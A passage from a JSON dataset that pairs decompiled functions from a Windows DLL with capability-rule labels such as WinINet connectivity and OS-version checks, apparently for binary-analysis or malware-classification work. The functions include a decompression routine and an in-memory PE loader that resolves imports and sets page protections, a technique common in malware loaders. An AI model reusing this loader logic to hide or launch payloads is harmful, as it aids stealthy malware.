(uStack148 < 0x1000000) {\n                if (puVar5 <= puStackX16) {\n                    return 0;\n                }\n                uStack148 = uStack148 * 0x100;\n                uStack152 = uStack152 * 0x100 | *puStackX16;\n                puStackX16 = puStackX16 + 1;\n            }\n            uVar2 = (uStack148 >> 0xb) * *(iVar1 + 0x198 + uVar3 * 2);\n            if (uStack152 < uVar2) {\n                uStack148 = uVar2;\n                if (uVar2 < 0x1000000) {\n                    if (puVar5 <= puStackX16) {\n                        return 0;\n                    }\n                    uStack148 = uVar2 * 0x100;\n                    uStack152 = uStack152 << 8 | *puStackX16;\n                    puStackX16 = puStackX16 + 1;\n                }\n                uVar3 = (uStack148 >> 0xb) * *(iVar1 + 0x1e0 + (uVar3 << 4) * 2 + uVar4 * 2);\n                if (uStack152 < uVar3) {\n                    if ((uVar3 < 0x1000000) && (puVar5 <= puStackX16)) {\n                        return 0;\n                    }\n                    return 3;\n                }\n                uStack152 = uStack152 - uVar3;\n                uVar2 = uStack148 - uVar3;\n            }\n            else {\n                uStack148 = uStack148 - uVar2;\n                uStack152 = uStack152 - uVar2;\n                if (uStack148 < 0x1000000) {\n                    if (puVar5 <= puStackX16) {\n                        return 0;\n                    }\n                    uStack148 = uStack148 * 0x100;\n                    uStack152 = uStack152 * 0x100 | *puStackX16;\n                    puStackX16 = puStackX16 + 1;\n                }\n                uVar2 = (uStack148 >> 0xb) * *(iVar1 + 0x1b0 + uVar3 * 2);\n                if (uVar2 <= uStack152) {\n                    uStack148 = uStack148 - uVar2;\n                    uStack152 = uStack152 - uVar2;\n                    if (uStack148 < 0x1000000) {\n                        if (puVar5 <= puStackX16) {\n                            return 0;\n                        }\n                        uStack148 = uStack148 * 0x100;\n                        uStack152 = uStack152 * 0x100 | *puStackX16;\n                        puStackX16 = puStackX16 + 1;\n                    }\n                    uVar2 = (uStack148 >> 0xb) * *(iVar1 + 0x1c8 + uVar3 * 2);\n                    if (uVar2 <= uStack152) {\n                        uStack152 = uStack152 - uVar2;\n                        uVar2 = uStack148 - uVar2;\n                    }\n                }\n            }\n            uStack148 = uVar2;\n            uStack136 = 0xc;\n            puStack120 = iVar1 + 0xa68;\n        }\n        if (uStack148 < 0x1000000) {\n            if (puVar5 <= puStackX16) {\n                return 0;\n            }\n            uStack148 = uStack148 << 8;\n            uStack152 = uStack152 << 8 | *puStackX16;\n            puStackX16 = puStackX16 + 1;\n        }\n        uVar3 = (uStack148 >> 0xb) * *puStack120;\n        if (uStack152 < uVar3) {\n            puStack80 = puStack120 + (uVar4 << 3) + 2;\n            iStack72 = 0;\n            uStack68 = 8;\n            uStack148 = uVar3;\n        }\n        else {\n            uStack148 = uStack148 - uVar3;\n            uStack152 = uStack152 - uVar3;\n            if (uStack148 < 0x1000000) {\n                if (puVar5 <= puStackX16) {\n                    return 0;\n                }\n                uStack148 = uStack148 * 0x100;\n                uStack152 = uStack152 * 0x100 | *puStackX16;\n                puStackX16 = puStackX16 + 1;\n            }\n            uVar3 = (uStack148 >> 0xb) * puStack120[1];\n            if (uStack152 < uVar3) {\n                puStack80 = puStack120 + (uVar4 << 3) + 0x82;\n                iStack72 = 8;\n                uStack68 = 8;\n                uStack148 = uVar3;\n            }\n            else {\n                uStack148 = uStack148 - uVar3;\n                uStack152 = uStack152 - uVar3;\n                puStack80 = puStack120 + 0x102;\n                iStack72 = 0x10;\n                uStack68 = 0x100;\n            }\n        }\n        uStack84 = 1;\n        do {\n            if (uStack148 < 0x1000000) {\n                if (puVar5 <= puStackX16) {\n                    return 0;\n                }\n                uStack148 = uStack148 << 8;\n                uStack152 = uStack152 << 8 | *puStackX16;\n                puStackX16 = puStackX16 + 1;\n            }\n            uVar3 = (uStack148 >> 0xb) * puStack80[uStack84];\n            if (uStack152 < uVar3) {\n                uStack84 = uStack84 * 2;\n                uStack148 = uVar3;\n            }\n            else {\n                uStack148 = uStack148 - uVar3;\n                uStack152 = uStack152 - uVar3;\n                uStack84 = uStack84 * 2 + 1;\n            }\n        } while (uStack84 < uStack68);\n        uStack24 = (uStack84 - uStack68) + iStack72;\n        if (uStack136 < 4) {\n            if (3 < uStack24) {\n                uStack24 = 3;\n            }\n            uStack64 = 1;\n            do {\n                if (uStack148 < 0x1000000) {\n                    if (puVar5 <= puStackX16) {\n                        return 0;\n                    }\n                    uStack148 = uStack148 << 8;\n                    uStack152 = uStack152 << 8 | *puStackX16;\n                    puStackX16 = puStackX16 + 1;\n                }\n                uVar3 = (uStack148 >> 0xb) * *(iVar1 + 0x360 + (uStack24 << 6) * 2 + uStack64 * 2);\n                if (uStack152 < uVar3) {\n                    uStack64 = uStack64 * 2;\n                    uStack148 = uVar3;\n                }\n                else {\n                    uStack148 = uStack148 - uVar3;\n                    uStack152 = uStack152 - uVar3;\n                    uStack64 = uStack64 * 2 + 1;\n                }\n            } while (uStack64 < 0x40);\n            uStack64 = uStack64 - 0x40;\n            if (3 < uStack64) {\n                iStack60 = (uStack64 >> 1) - 1;\n                if (uStack64 < 0xe) {\n                    puStack120 = iVar1 + ((uStack64 & 1 | 2) << (iStack60 & 0x1f)) * 2 + uStack64 * -2 + 0x55e;\n                }\n                else {\n                    iStack60 = (uStack64 >> 1) - 5;\n                    do {\n                        if (uStack148 < 0x1000000) {\n                            if (puVar5 <= puStackX16) {\n                                return 0;\n                            }\n                            uStack148 = uStack148 << 8;\n                            uStack152 = uStack152 << 8 | *puStackX16;\n                            puStackX16 = puStackX16 + 1;\n                        }\n                        uStack148 = uStack148 >> 1;\n                        uStack152 = uStack152 - (uStack148 & 0xffffffffU - (uStack152 - uStack148 >> 0x1f));\n                        iStack60 = iStack60 + -1;\n                    } while (iStack60 != 0);\n                    puStack120 = iVar1 + 0x644;\n                    iStack60 = 4;\n                }\n                uStack56 = 1;\n                do {\n                    if (uStack148 < 0x1000000) {\n                        if (puVar5 <= puStackX16) {\n                            return 0;\n                        }\n                        uStack148 = uStack148 << 8;\n                        uStack152 = uStack152 << 8 | *puStackX16;\n                        puStackX16 = puStackX16 + 1;\n                    }\n                    uVar3 = (uStack148 >> 0xb) * *(puStack120 + uStack56 * 2);\n                    if (uStack152 < uVar3) {\n                        uStack56 = uStack56 * 2;\n                        uStack148 = uVar3;\n                    }\n                    else {\n                        uStack148 = uStack148 - uVar3;\n                        uStack152 = uStack152 - uVar3;\n                        uStack56 = uStack56 * 2 + 1;\n                    }\n                    iStack60 = iStack60 + -1;\n                } while (iStack60 != 0);\n            }\n        }\n    }\n    if ((uStack148 < 0x1000000) && (puVar5 <= puStackX16)) {\n        uStack168 = 0;\n    }\n    return uStack168;\n}\n",
        "token_count": 3696
    },
    "18000698": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180006980(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    *(arg1 + 0x60) = 1;\n    *(arg1 + 0x5c) = 0;\n    *(arg1 + 0x6c) = 0;\n    if (arg2 != 0) {\n        *(arg1 + 0x40) = 0;\n        *(arg1 + 0x44) = 0;\n        *(arg1 + 100) = 1;\n    }\n    if (arg3 != 0) {\n        *(arg1 + 100) = 1;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "180006af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.180006af0(int64_t arg1, uint64_t arg2, uchar *arg3, uint64_t *arg4)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uchar *puVar4;\n    uchar *puStackX24;\n    int32_t in_stack_00000028;\n    uint *in_stack_00000030;\n    uint64_t uStack88;\n    uchar *puStack64;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    \n    uStack88 = *arg4;\n    *arg4 = 0;\n    fcn.1800056a0(arg1, arg2);\n    *in_stack_00000030 = 0;\n    puStackX24 = arg3;\n    do {\n        if (*(arg1 + 0x5c) == 0x112) {\n            if (*(arg1 + 0x2c) == 0) {\n                *in_stack_00000030 = 1;\n            }\n            return *(arg1 + 0x2c) != 0;\n        }\n        if (*(arg1 + 0x60) != 0) {\n            while ((uStack88 != 0 && (*(arg1 + 0x6c) < 5))) {\n                *(arg1 + 0x70 + *(arg1 + 0x6c)) = *puStackX24;\n                *(arg1 + 0x6c) = *(arg1 + 0x6c) + 1;\n                puStackX24 = puStackX24 + 1;\n                *arg4 = *arg4 + 1;\n                uStack88 = uStack88 - 1;\n            }\n            if (*(arg1 + 0x6c) < 5) {\n                *in_stack_00000030 = 3;\n                return false;\n            }\n            if (*(arg1 + 0x70) != '\\0') {\n                return true;\n            }\n            fcn.180006920(arg1, arg1 + 0x70);\n            *(arg1 + 0x6c) = 0;\n        }\n        bVar1 = false;\n        if (arg2 <= *(arg1 + 0x30)) {\n            if ((*(arg1 + 0x5c) == 0) && (*(arg1 + 0x2c) == 0)) {\n                *in_stack_00000030 = 4;\n                return false;\n            }\n            if (in_stack_00000028 == 0) {\n                *in_stack_00000030 = 2;\n                return false;\n            }\n            if (*(arg1 + 0x5c) != 0) {\n                *in_stack_00000030 = 2;\n                return true;\n            }\n            bVar1 = true;\n        }\n        if (*(arg1 + 100) != 0) {\n            fcn.180006a30(arg1);\n        }\n        if (*(arg1 + 0x6c) == 0) {\n            if ((uStack88 < 0x14) || (bVar1)) {\n                iVar2 = fcn.180005940(arg1, puStackX24, uStack88);\n                if (iVar2 == 0) {\n                    puVar4 = arg1 + 0x70;\n                    for (uVar3 = uStack88; uVar3 != 0; uVar3 = uVar3 - 1) {\n                        *puVar4 = *puStackX24;\n                        puStackX24 = puStackX24 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    *(arg1 + 0x6c) = uStack88;\n                    *arg4 = *arg4 + uStack88;\n                    *in_stack_00000030 = 3;\n                    return false;\n                }\n                if ((bVar1) && (iVar2 != 2)) {\n                    *in_stack_00000030 = 2;\n                    return true;\n                }\n                puStack64 = puStackX24;\n            }\n            else {\n                puStack64 = puStackX24 + (uStack88 - 0x14);\n            }\n            *(arg1 + 0x20) = puStackX24;\n            iVar2 = fcn.180005820(arg1, arg2, puStack64);\n            if (iVar2 != 0) {\n                return true;\n            }\n            uVar3 = *(arg1 + 0x20) - puStackX24;\n            *arg4 = *arg4 + uVar3;\n        }\n        else {\n            uStack52 = *(arg1 + 0x6c);\n            for (uStack48 = 0; (uStack52 < 0x14 && (uStack48 < uStack88)); uStack48 = uStack48 + 1) {\n                *(arg1 + 0x70 + uStack52) = puStackX24[uStack48];\n                uStack52 = uStack52 + 1;\n            }\n            *(arg1 + 0x6c) = uStack52;\n            if ((uStack52 < 0x14) || (bVar1)) {\n                iVar2 = fcn.180005940(arg1, arg1 + 0x70, uStack52);\n                if (iVar2 == 0) {\n                    *arg4 = uStack48 + *arg4;\n                    *in_stack_00000030 = 3;\n                    return false;\n                }\n                if ((bVar1) && (iVar2 != 2)) {\n                    *in_stack_00000030 = 2;\n                    return true;\n                }\n            }\n            *(arg1 + 0x20) = arg1 + 0x70;\n            iVar2 = fcn.180005820(arg1, arg2, *(arg1 + 0x20));\n            if (iVar2 != 0) {\n                return true;\n            }\n            uStack48 = uStack48 - (uStack52 - (*(arg1 + 0x20) - (arg1 + 0x70)));\n            *arg4 = uStack48 + *arg4;\n            uVar3 = uStack48;\n            *(arg1 + 0x6c) = 0;\n        }\n        uStack88 = uStack88 - uVar3;\n        puStackX24 = puStackX24 + uVar3;\n    } while( true );\n}\n",
        "token_count": 1416
    },
    "1800070e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1800070e0(int64_t arg1, uchar *arg2, uint64_t *arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar *puStackX16;\n    int64_t iStackX32;\n    int64_t *in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t iStack88;\n    uint64_t uStack80;\n    int64_t iStack64;\n    int64_t iStack56;\n    int64_t iStack48;\n    uint uStack40;\n    \n    uStack80 = *arg3;\n    iStack88 = *in_stack_00000028;\n    *arg3 = 0;\n    *in_stack_00000028 = 0;\n    puStackX16 = arg2;\n    iStackX32 = arg4;\n    while( true ) {\n        iStack64 = iStack88;\n        if (*(arg1 + 0x30) == *(arg1 + 0x38)) {\n            *(arg1 + 0x30) = 0;\n        }\n        iStack48 = *(arg1 + 0x30);\n        if (*(arg1 + 0x38) - iStack48 < uStack80) {\n            iStack56 = *(arg1 + 0x38);\n            uStack40 = 0;\n        }\n        else {\n            iStack56 = iStack48 + uStack80;\n            uStack40 = in_stack_00000030;\n        }\n        iVar1 = fcn.180006af0(arg1, iStack56, iStackX32, &iStack64);\n        iStackX32 = iStackX32 + iStack64;\n        iStack88 = iStack88 - iStack64;\n        *in_stack_00000028 = *in_stack_00000028 + iStack64;\n        iVar2 = *(arg1 + 0x30) - iStack48;\n        puVar4 = *(arg1 + 0x18) + iStack48;\n        puVar5 = puStackX16;\n        for (iVar3 = iVar2; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puStackX16 = puStackX16 + iVar2;\n        uStack80 = uStack80 - iVar2;\n        *arg3 = *arg3 + iVar2;\n        if (iVar1 != 0) break;\n        if ((iVar2 == 0) || (uStack80 == 0)) {\n            return 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 628
    },
    "1800074c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1800074c0(int64_t arg1, uint *arg2, code **arg3)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar1 = (0x300 << (*arg2 + arg2[1] & 0x1fU)) + 0x736;\n    if ((*(arg1 + 0x10) == 0) || (uVar1 != *(arg1 + 0x68))) {\n        fcn.180007310(arg1, arg3);\n        uVar2 = (**arg3)(arg3, uVar1 << 1);\n        *(arg1 + 0x10) = uVar2;\n        *(arg1 + 0x68) = uVar1;\n        if (*(arg1 + 0x10) == 0) {\n            return 2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "18000757": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180007570(uchar *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uchar auStack104 [40];\n    uchar auStack64 [16];\n    int32_t iStack48;\n    int32_t iStack44;\n    uint64_t uStack40;\n    \n    uStack40 = *0x180040248 ^ auStack104;\n    iStack48 = fcn.1800073d0(auStack64, arg2, arg3);\n    if (iStack48 == 0) {\n        iStack44 = fcn.1800074c0(arg1, auStack64, arg4);\n        if (iStack44 == 0) {\n            puVar2 = auStack64;\n            for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *arg1 = *puVar2;\n                puVar2 = puVar2 + 1;\n                arg1 = arg1 + 1;\n            }\n        }\n    }\n    fcn.180023980(uStack40 ^ auStack104);\n    return;\n}\n",
        "token_count": 260
    },
    "18000762": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180007620(uchar *arg1, ulong arg2, ulong arg3, code **arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar auStack104 [32];\n    uint64_t uStack72;\n    uchar auStack56 [12];\n    uint32_t uStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    uint64_t uStack32;\n    \n    uStack32 = *0x180040248 ^ auStack104;\n    iStack40 = fcn.1800073d0(auStack56, arg2, arg3);\n    if (iStack40 == 0) {\n        iStack36 = fcn.1800074c0(arg1, auStack56, arg4);\n        if (iStack36 == 0) {\n            uStack72 = uStack44;\n            if ((*(arg1 + 0x18) == 0) || (uStack72 != *(arg1 + 0x38))) {\n                fcn.180007350(arg1, arg4);\n                uVar1 = (**arg4)(arg4, uStack72);\n                *(arg1 + 0x18) = uVar1;\n                if (*(arg1 + 0x18) == 0) {\n                    fcn.180007310(arg1, arg4);\n                    goto code_r0x00018000773f;\n                }\n            }\n            *(arg1 + 0x38) = uStack72;\n            puVar3 = auStack56;\n            for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg1 = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg1 = arg1 + 1;\n            }\n        }\n    }\ncode_r0x00018000773f:\n    fcn.180023980(uStack32 ^ auStack104);\n    return;\n}\n",
        "token_count": 438
    },
    "18000776": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180007760(ulong arg1, ulong *arg2, ulong arg3, uint64_t *arg4)\n\n{\n    ulong in_stack_00000028;\n    uint32_t in_stack_00000030;\n    int32_t *in_stack_00000040;\n    ulong in_stack_00000048;\n    uchar auStack264 [64];\n    uchar auStack200 [16];\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack152;\n    ulong uStack144;\n    int32_t iStack56;\n    uint64_t uStack48;\n    ulong uStack40;\n    int32_t iStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack264;\n    uStack40 = *arg2;\n    uStack48 = *arg4;\n    *arg4 = 0;\n    *arg2 = 0;\n    *in_stack_00000040 = 0;\n    if (4 < uStack48) {\n        uStack176 = 0;\n        uStack184 = 0;\n        iStack32 = fcn.180007570(auStack200, in_stack_00000028, in_stack_00000030, in_stack_00000048);\n        if (iStack32 == 0) {\n            uStack144 = uStack40;\n            uStack176 = arg1;\n            fcn.180006a00(auStack200);\n            *arg4 = uStack48;\n            iStack56 = fcn.180006af0(auStack200, uStack40, arg3, arg4);\n            *arg2 = uStack152;\n            if ((iStack56 == 0) && (*in_stack_00000040 == 3)) {\n                iStack56 = 6;\n            }\n            fcn.180007310(auStack200, in_stack_00000048);\n        }\n    }\n    fcn.180023980(uStack24 ^ auStack264);\n    return;\n}\n",
        "token_count": 436
    },
    "1800098e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1800098e0(int64_t arg1, ulong arg2, int64_t arg3, int64_t *arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint64_t uVar6;\n    uchar *puVar7;\n    int32_t iStack72;\n    uint uStack64;\n    int64_t iStack40;\n    \n    iVar1 = arg4[1];\n    iStack40 = *arg4 + 0x18 + *(*arg4 + 0x14);\n    iStack72 = 0;\n    do {\n        if (*(*arg4 + 6) <= iStack72) {\n            return 1;\n        }\n        if (*(iStack40 + 0x10) == 0) {\n            iVar2 = *(arg3 + 0x38);\n            if (0 < iVar2) {\n                iVar3 = (*arg4[5])(iVar1 + *(iStack40 + 0xc), iVar2, 0x1000, 4, arg4[10]);\n                if (iVar3 == 0) {\n                    return 0;\n                }\n                puVar4 = iVar1 + *(iStack40 + 0xc);\n                uStack64 = SUB84(puVar4, 0);\n                *(iStack40 + 8) = uStack64;\n                for (iVar3 = iVar2; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n            }\n        }\n        else {\n            iVar2 = fcn.1800098a0(arg2, *(iStack40 + 0x14) + *(iStack40 + 0x10));\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar3 = (*arg4[5])(iVar1 + *(iStack40 + 0xc), *(iStack40 + 0x10), 0x1000, 4, arg4[10]);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            puVar5 = iVar1 + *(iStack40 + 0xc);\n            puVar4 = arg1 + *(iStack40 + 0x14);\n            puVar7 = puVar5;\n            for (uVar6 = *(iStack40 + 0x10); uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            uStack64 = SUB84(puVar5, 0);\n            *(iStack40 + 8) = uStack64;\n        }\n        iStack72 = iStack72 + 1;\n        iStack40 = iStack40 + 0x28;\n    } while( true );\n}\n",
        "token_count": 666
    },
    "180009b1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180009b10(int64_t *arg1, int64_t arg2)\n\n{\n    int32_t iStack24;\n    \n    iStack24 = *(arg2 + 0x10);\n    if (iStack24 == 0) {\n        if ((*(arg2 + 0x24) & 0x40) == 0) {\n            if ((*(arg2 + 0x24) & 0x80) != 0) {\n                iStack24 = *(*arg1 + 0x24);\n            }\n        }\n        else {\n            iStack24 = *(*arg1 + 0x20);\n        }\n    }\n    return iStack24;\n}\n",
        "token_count": 151
    },
    "180009b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180009b80(int64_t *arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar auStack40 [4];\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    if (*(arg2 + 2) == 0) {\n        uVar2 = 1;\n    }\n    else if ((*(arg2 + 0x14) & 0x2000000) == 0) {\n        uStack20 = (*(arg2 + 0x14) & 0x20000000) != 0;\n        uStack32 = uStack20;\n        uStack16 = (*(arg2 + 0x14) & 0x40000000) != 0;\n        uStack24 = uStack16;\n        uStack12 = (*(arg2 + 0x14) & 0x80000000) != 0;\n        uStack36 = uStack12;\n        uStack28 = *(uStack20 * 0x10 + 0x1800489a0 + uStack16 * 8 + uStack12 * 4);\n        if ((*(arg2 + 0x14) & 0x4000000) != 0) {\n            uStack28 = uStack28 | 0x200;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(*arg2, *(arg2 + 2), uStack28, auStack40);\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    else {\n        if ((*arg2 == arg2[1]) &&\n           (((*(arg2 + 3) != 0 || (*(*arg1 + 0x38) == *(arg1 + 0xc))) || (*(arg2 + 2) % *(arg1 + 0xc) == 0)))) {\n            (*arg1[6])(*arg2, *(arg2 + 2), 0x4000, arg1[10]);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 522
    },
    "180009f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180009f70(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code **ppcStack24;\n    \n    iVar1 = arg1[1];\n    if ((*(*arg1 + 0xd0) != 0) && (ppcStack24 = *(iVar1 + *(*arg1 + 0xd0) + 0x18),  ppcStack24 != NULL)) {\n        for (; *ppcStack24 != NULL; ppcStack24 = ppcStack24 + 1) {\n            (**ppcStack24)(iVar1, 1, 0);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 144
    },
    "18000a02": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.18000a020(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    int64_t *piVar4;\n    bool bVar5;\n    int32_t iStackX16;\n    uint32_t *puStack104;\n    uint32_t uStack80;\n    uint32_t *puStack64;\n    \n    iVar1 = arg1[1];\n    if (*(*arg1 + 0xb4) == 0) {\n        bVar5 = arg2 == 0;\n    }\n    else {\n        for (puStack104 = iVar1 + *(*arg1 + 0xb0); *puStack104 != 0; puStack104 = puStack104 + puStack104[1]) {\n            iVar2 = iVar1 + *puStack104;\n            puStack64 = puStack104 + 2;\n            for (uStack80 = 0; uStack80 < (puStack104[1] - 8) / 2; uStack80 = uStack80 + 1) {\n                if (*puStack64 >> 0xc == 3) {\n                    piVar3 = iVar2 + (*puStack64 & 0xfff);\n                    iStackX16 = arg2;\n                    *piVar3 = *piVar3 + iStackX16;\n                }\n                else if (*puStack64 >> 0xc == 10) {\n                    piVar4 = iVar2 + (*puStack64 & 0xfff);\n                    *piVar4 = *piVar4 + arg2;\n                }\n                puStack64 = puStack64 + 2;\n            }\n        }\n        bVar5 = true;\n    }\n    return bVar5;\n}\n",
        "token_count": 386
    },
    "18000a1d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.18000a1d0(int64_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint32_t *puStack88;\n    int32_t iStack72;\n    int64_t *piStack56;\n    uint64_t *puStack40;\n    \n    iVar3 = arg1[1];\n    iStack72 = 1;\n    if (*(*arg1 + 0x94) == 0) {\n        iStack72 = 1;\n    }\n    else {\n        puStack88 = iVar3 + *(*arg1 + 0x90);\n        while( true ) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(puStack88, 0x14);\n            if (iVar4 != 0) {\n                return iStack72;\n            }\n            if (puStack88[3] == 0) {\n                return iStack72;\n            }\n            iVar5 = (*arg1[7])(iVar3 + puStack88[3], arg1[10]);\n            if (iVar5 == 0) break;\n            iVar6 = fcn.1800243bc(arg1[2], *(arg1 + 3) + 1 << 3);\n            if (iVar6 == 0) {\n                (*arg1[9])(iVar5, arg1[10]);\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                return 0;\n            }\n            arg1[2] = iVar6;\n            *(arg1[2] + *(arg1 + 3) * 8) = iVar5;\n            *(arg1 + 3) = *(arg1 + 3) + 1;\n            if (*puStack88 == 0) {\n                uVar1 = puStack88[4];\n                uVar2 = puStack88[4];\n            }\n            else {\n                uVar1 = *puStack88;\n                uVar2 = puStack88[4];\n            }\n            piStack56 = iVar3 + uVar2;\n            for (puStack40 = iVar3 + uVar1; *puStack40 != 0; puStack40 = puStack40 + 1) {\n                if ((*puStack40 & 0x8000000000000000) == 0) {\n                    iVar6 = (*arg1[8])(iVar5, iVar3 + *puStack40 + 2, arg1[10]);\n                    *piStack56 = iVar6;\n                }\n                else {\n                    iVar6 = (*arg1[8])(iVar5, *puStack40 & 0xffff, arg1[10]);\n                    *piStack56 = iVar6;\n                }\n                if (*piStack56 == 0) {\n                    iStack72 = 0;\n                    break;\n                }\n                piStack56 = piStack56 + 1;\n            }\n            if (iStack72 == 0) {\n                (*arg1[9])(iVar5, arg1[10]);\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                return 0;\n            }\n            puStack88 = puStack88 + 5;\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x7e);\n        iStack72 = 0;\n    }\n    return iStack72;\n}\n",
        "token_count": 748
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
